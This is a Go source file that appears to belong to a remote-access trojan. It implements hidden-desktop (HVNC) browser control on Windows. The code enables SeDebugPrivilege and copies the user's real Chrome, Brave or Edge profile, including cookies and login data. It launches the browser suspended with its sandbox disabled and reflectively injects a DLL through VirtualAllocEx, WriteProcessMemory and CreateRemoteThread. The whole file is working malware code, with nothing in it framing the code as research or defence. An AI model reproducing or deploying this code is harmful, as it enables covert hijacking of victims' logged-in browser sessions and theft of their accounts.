//go:build windows

package capture

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	procOpenProcess           = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx        = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory    = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread    = kernel32.NewProc("CreateRemoteThread")
	procWaitForSingleObject   = kernel32.NewProc("WaitForSingleObject")
	procCloseHandle           = kernel32.NewProc("CloseHandle")
	procResumeThread          = kernel32.NewProc("ResumeThread")
	procOpenProcessToken      = advapi32.NewProc("OpenProcessToken")
	procLookupPrivilegeValueW = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
)

var advapi32 = syscall.NewLazyDLL("advapi32.dll")

type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status string)

const (
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
	PROCESS_ALL_ACCESS_INJ    = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ

	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40

	INFINITE_WAIT = 0xFFFFFFFF

	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_QUERY             = 0x0008
	SE_PRIVILEGE_ENABLED    = 0x00000002

	CREATE_SUSPENDED           = 0x00000004
	CREATE_UNICODE_ENVIRONMENT = 0x00000400

	IMAGE_DIRECTORY_ENTRY_EXPORT  = 0
	IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b
	IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
)

// enableDebugPrivilege attempts to enable SeDebugPrivilege for the current process.
func enableDebugPrivilege() {
	var hToken uintptr
	currentProcess, _, _ := kernel32.NewProc("GetCurrentProcess").Call()
	ret, _, _ := procOpenProcessToken.Call(currentProcess, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return
	}
	defer procCloseHandle.Call(hToken)

	seDebug, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	type luid struct {
		LowPart  uint32
		HighPart int32
	}
	type luidAndAttributes struct {
		Luid       luid
		Attributes uint32
	}
	type tokenPrivileges struct {
		PrivilegeCount uint32
		Privileges     luidAndAttributes
	}
	var tp tokenPrivileges
	tp.PrivilegeCount = 1
	tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED

	ret, _, _ = procLookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(seDebug)), uintptr(unsafe.Pointer(&tp.Privileges.Luid)))
	if ret == 0 {
		return
	}
	procAdjustTokenPrivileges.Call(hToken, 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
}

// StartHVNCProcessInjected starts a process suspended on the HVNC desktop,
// injects the reflective DLL, then resumes it.
// searchPath/replacePath are passed as environment variables for the DLL hooks.
func StartHVNCProcessInjected(filePath string, dllBytes []byte, searchPath, replacePath string) error {
	if filePath == "" {
		return fmt.Errorf("empty file path")
	}
	if len(dllBytes) == 0 {
		return fmt.Errorf("empty DLL bytes")
	}

	result, err := executeHVNCTask(hvncTask{
		kind:        hvncTaskStartProcessInjected,
		filePath:    filePath,
		dllBytes:    dllBytes,
		searchPath:  searchPath,
		replacePath: replacePath,
	}, 30*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

// StartHVNCBrowserInjected starts a browser on the HVNC desktop with injection.
// If clone is true, it clones the real profile so file I/O is redirected to the clone.
// If clone is false, it starts the browser with injection but no path redirection.
// browser should be one of: "chrome", "brave", "edge".
func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool, onProgress CloneProgressFunc) error {
	info, ok := browserInfoMap[strings.ToLower(browser)]
	if !ok {
		return fmt.Errorf("unknown browser %q", browser)
	}

	if exePath == "" {
		exePath = findBrowserExe(info)
		if exePath == "" {
			return fmt.Errorf("%s not found", info.name)
		}
	}

	if !clone {
		log.Printf("hvnc %s: starting without profile cloning", info.name)
		return StartHVNCProcessInjected(exePath, dllBytes, "", "")
	}

	realUserData := getBrowserUserDataDir(info)
	if realUserData == "" {
		return fmt.Errorf("could not determine %s user data directory", info.name)
	}
	log.Printf("hvnc %s: real user data at %s", info.name, realUserData)

	cloneDir, err := cloneBrowserProfile(info.name, realUserData, cloneLite, onProgress)
	if err != nil {
		return fmt.Errorf("profile clone failed: %v", err)
	}
	log.Printf("hvnc %s: cloned profile to %s", info.name, cloneDir)

	return StartHVNCProcessInjected(exePath, dllBytes, realUserData, cloneDir)
}

// StartHVNCChromeInjected is kept for backward compatibility.
func StartHVNCChromeInjected(chromePath string, dllBytes []byte) error {
	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, true, false, nil)
}

type browserInfo struct {
	name       string
	exePaths   []string // candidate exe locations (env vars expanded at runtime)
	userData   string   // relative to LOCALAPPDATA (or APPDATA for Firefox)
	useAppData bool     // true = use APPDATA instead of LOCALAPPDATA
}

var browserInfoMap = map[string]browserInfo{
	"chrome": {
		name: "Chrome",
		exePaths: []string{
			`\Google\Chrome\Application\chrome.exe`,
		},
		userData: `Google\Chrome\User Data`,
	},
	"brave": {
		name: "Brave",
		exePaths: []string{
			`\BraveSoftware\Brave-Browser\Application\brave.exe`,
		},
		userData: `BraveSoftware\Brave-Browser\User Data`,
	},
	"edge": {
		name: "Edge",
		exePaths: []string{
			`\Microsoft\Edge\Application\msedge.exe`,
		},
		userData: `Microsoft\Edge\User Data`,
	},
}

func findBrowserExe(info browserInfo) string {
	roots := []string{
		os.Getenv("ProgramFiles"),
		os.Getenv("ProgramFiles(x86)"),
		os.Getenv("LOCALAPPDATA"),
	}
	for _, root := range roots {
		if root == "" {
			continue
		}
		for _, suffix := range info.exePaths {
			p := root + suffix
			if _, err := os.Stat(p); err == nil {
				return p
			}
		}
	}
	return ""
}

func getBrowserUserDataDir(info browserInfo) string {
	base := os.Getenv("LOCALAPPDATA")
	if info.useAppData {
		base = os.Getenv("APPDATA")
	}
	if base == "" {
		return ""
	}
	dir := filepath.Join(base, info.userData)
	if fi, err := os.Stat(dir); err == nil && fi.IsDir() {
		return dir
	}
	return ""
}

// cloneBrowserProfile clones the browser user data directory, skipping only
// large cache directories that aren't needed for a functional session.
// This preserves extensions, cookies, login data, local storage, etc.
func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onProgress CloneProgressFunc) (string, error) {
	prefix := "hvnc_" + strings.ToLower(browserName) + "_"
	// Remove any previous cloned profile directories so we always use fresh data
	tmpDir := os.TempDir()
	if old, err := os.ReadDir(tmpDir); err == nil {
		for _, e := range old {
			if strings.HasPrefix(e.Name(), prefix) && e.IsDir() {
				p := filepath.Join(tmpDir, e.Name())
				log.Printf("hvnc %s: removing old clone %s", browserName, p)
				os.RemoveAll(p)
			}
		}
	}

	cloneBase := filepath.Join(tmpDir, prefix+fmt.Sprintf("%d", time.Now().UnixNano()))
	if err := os.MkdirAll(cloneBase, 0700); err != nil {
		return "", fmt.Errorf("mkdir clone: %v", err)
	}

	// Directories to skip — these are large caches that aren't needed
	skipDirs := map[string]bool{
		"cache":          true,
		"code cache":     true,
		"gpucache":       true,
		"service worker": true,
		"crashpad":       true,
		"blob_storage":   true,
		"jumplisterrors": true,
		"optimization_guide_prediction_model_downloads": true,
		"segmentation_platform":                         true,
		"commerce_local_db":                             true,
	}

	if lite {
		log.Printf("hvnc %s: lite clone — skipping extensions and extra data", browserName)
		liteSkip := []string{
			"extensions",
			"extension state",
			"extension scripts",
			"extension rules",
			"local extension settings",
			"sync extension settings",
			"indexeddb",
			"file system",
			"session storage",
			"sessions",
			"sync data",
			"web applications",
			"webrtc internals",
			"databases",
			"platform notifications",
			"gcm store",
			"storage",
			"feature_engagement_tracker",
		}
		for _, d := range liteSkip {
			skipDirs[d] = true
		}
	}

	entries, err := os.ReadDir(srcUserData)
	if err != nil {
		return "", fmt.Errorf("read user data dir: %v", err)
	}

	// Calculate total size for progress reporting
	var totalBytes int64
	if onProgress != nil {
		onProgress(0, 0, 0, "scanning")
		totalBytes = calcCloneSize(srcUserData, skipDirs)
		onProgress(0, 0, totalBytes, "cloning")
	}

	var copiedBytes int64
	lastPercent := -1

	reportProgress := func(n int64) {
		if onProgress == nil || totalBytes <= 0 {
			return
		}
		copiedBytes += n
		pct := int(copiedBytes * 100 / totalBytes)
		if pct > 100 {
			pct = 100
		}
		if pct != lastPercent {
			lastPercent = pct
			onProgress(pct, copiedBytes, totalBytes, "cloning")
		}
	}

	for _, entry := range entries {
		name := entry.Name()
		src := filepath.Join(srcUserData, name)
		dst := filepath.Join(cloneBase, name)

		if entry.IsDir() {
			// For profile directories (Default, Profile N), clone contents but skip caches inside
			isProfile := strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
			if isProfile {
				if err := cloneProfileDirProgress(browserName, src, dst, skipDirs, reportProgress); err != nil {
					log.Printf("hvnc %s: warning: could not clone profile %s: %v", browserName, name, err)
				}
			} else if !skipDirs[strings.ToLower(name)] {
				// Top-level non-profile directories (e.g. "Crashpad" skip, but keep others)
				if err := copyDirProgress(src, dst, reportProgress); err != nil {
					log.Printf("hvnc %s: warning: could not copy dir %s: %v", browserName, name, err)
				}
			}
		} else {
			// Top-level files (Local State, etc.)
			n, err := copyFileCount(src, dst)
			if err != nil {
				log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, name, err)
			} else {
				reportProgress(n)
			}
		}
	}

	if onProgress != nil {
		onProgress(100, totalBytes, totalBytes, "done")
	}

	return cloneBase, nil
}

// calcCloneSize walks the source user data directory and returns the total
// byte count of files that would be copied (respecting skipDirs).
func calcCloneSize(srcUserData string, skipDirs map[string]bool) int64 {
	var total int64
	entries, err := os.ReadDir(srcUserData)
	if err != nil {
		return 0
	}
	for _, entry := range entries {
		name := entry.Name()
		p := filepath.Join(srcUserData, name)
		if entry.IsDir() {
			isProfile := strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
			if isProfile {
				total += calcProfileSize(p, skipDirs)
			} else if !skipDirs[strings.ToLower(name)] {
				total += calcDirSize(p)
			}
		} else {
			if info, err := entry.Info(); err == nil {
				total += info.Size()
			}
		}
	}
	return total
}

func calcProfileSize(dir string, skipDirs map[string]bool) int64 {
	var total int64
	entries, err := os.ReadDir(dir)
	if err != nil {
		return 0
	}
	for _, entry := range entries {
		name := entry.Name()
		p := filepath.Join(dir, name)
		if entry.IsDir() {
			if !skipDirs[strings.ToLower(name)] {
				total += calcDirSize(p)
			}
		} else {
			if info, err := entry.Info(); err == nil {
				total += info.Size()
			}
		}
	}
	return total
}

func calcDirSize(dir string) int64 {
	var total int64
	filepath.Walk(dir, func(_ string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() {
			total += info.Size()
		}
		return nil
	})
	return total
}

// cloneProfileDirProgress copies a profile directory with progress reporting.
func cloneProfileDirProgress(browserName, src, dst string, skipDirs map[string]bool, report func(int64)) error {
	if err := os.MkdirAll(dst, 0700); err != nil {
		return err
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		name := entry.Name()
		s := filepath.Join(src, name)
		d := filepath.Join(dst, name)

		if entry.IsDir() {
			if skipDirs[strings.ToLower(name)] {
				continue
			}
			if err := copyDirProgress(s, d, report); err != nil {
				log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, name, err)
			}
		} else {
			n, err := copyFileCount(s, d)
			if err != nil {
				log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, name, err)
			} else {
				report(n)
			}
		}
	}
	return nil
}

func copyFileCount(src, dst string) (int64, error) {
	in, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer in.Close()

	if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
		return 0, err
	}
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
	if err != nil {
		return 0, err
	}
	defer out.Close()

	n, err := io.Copy(out, in)
	return n, err
}

func copyDirProgress(src, dst string, report func(int64)) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // skip errors
		}
		rel, _ := filepath.Rel(src, path)
		target := filepath.Join(dst, rel)
		if info.IsDir() {
			return os.MkdirAll(target, 0700)
		}
		n, err := copyFileCount(path, target)
		if err == nil {
			report(n)
		}
		return err
	})
}

func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, searchPath, replacePath string) error {
	if filePath == "" {
		return fmt.Errorf("empty file path")
	}
	if len(dllBytes) == 0 {
		return fmt.Errorf("empty DLL bytes")
	}

	enableDebugPrivilege()

	// Create the process suspended on the HVNC desktop
	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath)
	if err != nil {
		return fmt.Errorf("failed to create suspended process: %v", err)
	}
	log.Printf("hvnc inject: created suspended process PID %d", pid)

	// Inject the reflective DLL
	if err := reflectiveInject(hProcess, dllBytes); err != nil {
		procCloseHandle.Call(hProcess)
		procCloseHandle.Call(hThread)
		// Try to kill the process
		terminateProcess(hProcess)
		return fmt.Errorf("DLL injection failed: %v", err)
	}
	log.Printf("hvnc inject: DLL injected into PID %d", pid)

	procCloseHandle.Call(hProcess)

	// Resume the main thread
	ret, _, _ := procResumeThread.Call(hThread)
	if ret == 0xFFFFFFFF {
		procCloseHandle.Call(hThread)
		return fmt.Errorf("failed to resume thread")
	}
	procCloseHandle.Call(hThread)

	log.Printf("hvnc inject: process PID %d resumed with DLL hooks active", pid)
	return nil
}

func terminateProcess(hProcess uintptr) {
	kernel32.NewProc("TerminateProcess").Call(hProcess, 1)
}

func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath string) (hProcess, hThread uintptr, pid uint32, err error) {
	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("failed to convert desktop name: %v", err)
	}
	args := " --window-position=0,0"
	browserExes := map[string]bool{
		"chrome.exe": true,
		"brave.exe":  true,
		"msedge.exe": true,
	}
	if browserExes[strings.ToLower(filepath.Base(filePath))] {
		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu"
	}
	cmdLine, err := syscall.UTF16FromString(filePath + args)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("failed to convert command line: %v", err)
	}

	var si startupInfo
	var pi processInformation
	si.cb = uint32(unsafe.Sizeof(si))
	si.lpDesktop = desktopNamePtr
	si.dwX = 0
	si.dwY = 0
	si.dwFlags = STARTF_USEPOSITION

	envBlock, err := buildEnvironmentBlock(searchPath, replacePath)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("failed to build environment block: %v", err)
	}

	ret, _, callErr := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(&cmdLine[0])),
		0,
		0,
		0,
		uintptr(CREATE_SUSPENDED|CREATE_UNICODE_ENVIRONMENT),
		uintptr(unsafe.Pointer(&envBlock[0])),
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		if callErr != nil {
			return 0, 0, 0, fmt.Errorf("CreateProcess failed: %v", callErr)
		}
		return 0, 0, 0, fmt.Errorf("CreateProcess failed")
	}

	return pi.hProcess, pi.hThread, pi.dwProcessId, nil
}

func buildEnvironmentBlock(searchPath, replacePath string) ([]uint16, error) {
	envStrings := syscall.Environ()

	envStrings = append(envStrings, "RDI_SEARCH_PATH="+searchPath)
	envStrings = append(envStrings, "RDI_REPLACE_PATH="+replacePath)

	var block []uint16
	for _, s := range envStrings {
		u, err := syscall.UTF16FromString(s)
		if err != nil {
			continue
		}
		block = append(block, u...)
	}
	block = append(block, 0)
	return block, nil
}

func reflectiveInject(hProcess uintptr, dllBytes []byte) error {
	loaderOffset, err := findReflectiveLoaderOffset(dllBytes)
	if err != nil {
		return fmt.Errorf("failed to find ReflectiveLoader: %v", err)
	}
	log.Printf("hvnc inject: ReflectiveLoader at offset 0x%x", loaderOffset)

	remoteBase, _, _ := procVirtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(dllBytes)),
		MEM_RESERVE|MEM_COMMIT,
		PAGE_EXECUTE_READWRITE,
	)
	if remoteBase == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}

	var bytesWritten uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		hProcess,
		remoteBase,
		uintptr(unsafe.Pointer(&dllBytes[0])),
		uintptr(len(dllBytes)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed")
	}

	remoteLoader := remoteBase + uintptr(loaderOffset)

	var threadID uintptr
	hThread, _, _ := procCreateRemoteThread.Call(
		hProcess,
		0,
		1024*1024,
		remoteLoader,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread failed")
	}

	procWaitForSingleObject.Call(hThread, INFINITE_WAIT)
	procCloseHandle.Call(hThread)

	return nil
}

func findReflectiveLoaderOffset(pe []byte) (uint32, error) {
	if len(pe) < 64 {
		return 0, fmt.Errorf("PE too small")
	}

	if pe[0] != 'M' || pe[1] != 'Z' {
		return 0, fmt.Errorf("invalid DOS signature")
	}
	lfanew := binary.LittleEndian.Uint32(pe[60:64])
	if int(lfanew)+4 > len(pe) {
		return 0, fmt.Errorf("invalid e_lfanew")
	}

	sig := binary.LittleEndian.Uint32(pe[lfanew : lfanew+4])
	if sig != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}

	coffOff := lfanew + 4
	if int(coffOff)+20 > len(pe) {
		return 0, fmt.Errorf("PE too small for COFF header")
	}
	numberOfSections := binary.LittleEndian.Uint16(pe[coffOff+2 : coffOff+4])
	sizeOfOptionalHeader := binary.LittleEndian.Uint16(pe[coffOff+16 : coffOff+18])

	optOff := coffOff + 20
	if int(optOff)+2 > len(pe) {
		return 0, fmt.Errorf("PE too small for optional header")
	}
	magic := binary.LittleEndian.Uint16(pe[optOff : optOff+2])

	var exportDirRVA uint32
	switch magic {
	case IMAGE_NT_OPTIONAL_HDR64_MAGIC:
		ddOff := optOff + 112
		if int(ddOff)+8 > len(pe) {
			return 0, fmt.Errorf("PE too small for data directory")
		}
		exportDirRVA = binary.LittleEndian.Uint32(pe[ddOff : ddOff+4])
	case IMAGE_NT_OPTIONAL_HDR32_MAGIC:
		// PE32 - export directory is at offset 96 in optional header
		ddOff := optOff + 96
		if int(ddOff)+8 > len(pe) {
			return 0, fmt.Errorf("PE too small for data directory")
		}
		exportDirRVA = binary.LittleEndian.Uint32(pe[ddOff : ddOff+4])
	default:
		return 0, fmt.Errorf("unsupported PE magic: 0x%x", magic)
	}

	if exportDirRVA == 0 {
		return 0, fmt.Errorf("no export directory")
	}

	sectionOff := optOff + uint32(sizeOfOptionalHeader)

	exportDirFileOff := rvaToFileOffset(exportDirRVA, pe, sectionOff, numberOfSections)
	if exportDirFileOff == 0 {
		return 0, fmt.Errorf("failed to resolve export directory RVA")
	}

	if int(exportDirFileOff)+40 > len(pe) {
		return 0, fmt.Errorf("PE too small for export directory")
	}
	numberOfNames := binary.LittleEndian.Uint32(pe[exportDirFileOff+24 : exportDirFileOff+28])
	addressOfFunctionsRVA := binary.LittleEndian.Uint32(pe[exportDirFileOff+28 : exportDirFileOff+32])
	addressOfNamesRVA := binary.LittleEndian.Uint32(pe[exportDirFileOff+32 : exportDirFileOff+36])
	addressOfNameOrdinalsRVA := binary.LittleEndian.Uint32(pe[exportDirFileOff+36 : exportDirFileOff+40])

	namesOff := rvaToFileOffset(addressOfNamesRVA, pe, sectionOff, numberOfSections)
	funcsOff := rvaToFileOffset(addressOfFunctionsRVA, pe, sectionOff, numberOfSections)
	ordinalsOff := rvaToFileOffset(addressOfNameOrdinalsRVA, pe, sectionOff, numberOfSections)
	if namesOff == 0 || funcsOff == 0 || ordinalsOff == 0 {
		return 0, fmt.Errorf("failed to resolve export table RVAs")
	}

	for i := uint32(0); i < numberOfNames; i++ {
		nameRVA := binary.LittleEndian.Uint32(pe[namesOff+i*4 : namesOff+i*4+4])
		nameFileOff := rvaToFileOffset(nameRVA, pe, sectionOff, numberOfSections)
		if nameFileOff == 0 {
			continue
		}

		name := readCString(pe, nameFileOff)
		if contains(name, "ReflectiveLoader") {
			ordinal := binary.LittleEndian.Uint16(pe[ordinalsOff+i*2 : ordinalsOff+i*2+2])
			funcRVA := binary.LittleEndian.Uint32(pe[funcsOff+uint32(ordinal)*4 : funcsOff+uint32(ordinal)*4+4])
			return rvaToFileOffset(funcRVA, pe, sectionOff, numberOfSections), nil
		}
	}

	return 0, fmt.Errorf("ReflectiveLoader export not found")
}

func rvaToFileOffset(rva uint32, pe []byte, sectionOff uint32, numSections uint16) uint32 {
	for i := uint16(0); i < numSections; i++ {
		off := sectionOff + uint32(i)*40
		if int(off)+40 > len(pe) {
			break
		}
		virtualSize := binary.LittleEndian.Uint32(pe[off+8 : off+12])
		virtualAddr := binary.LittleEndian.Uint32(pe[off+12 : off+16])
		rawDataSize := binary.LittleEndian.Uint32(pe[off+16 : off+20])
		rawDataPtr := binary.LittleEndian.Uint32(pe[off+20 : off+24])
		_ = virtualSize

		if rva >= virtualAddr && rva < virtualAddr+rawDataSize {
			return rva - virtualAddr + rawDataPtr
		}
	}
	if numSections > 0 {
		firstSectionRawPtr := binary.LittleEndian.Uint32(pe[sectionOff+20 : sectionOff+24])
		if rva < firstSectionRawPtr {
			return rva
		}
	}
	return 0
}

func readCString(data []byte, offset uint32) string {
	end := offset
	for int(end) < len(data) && data[end] != 0 {
		end++
	}
	return string(data[offset:end])
}

func contains(s, substr string) bool {
	if len(substr) > len(s) {
		return false
	}
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
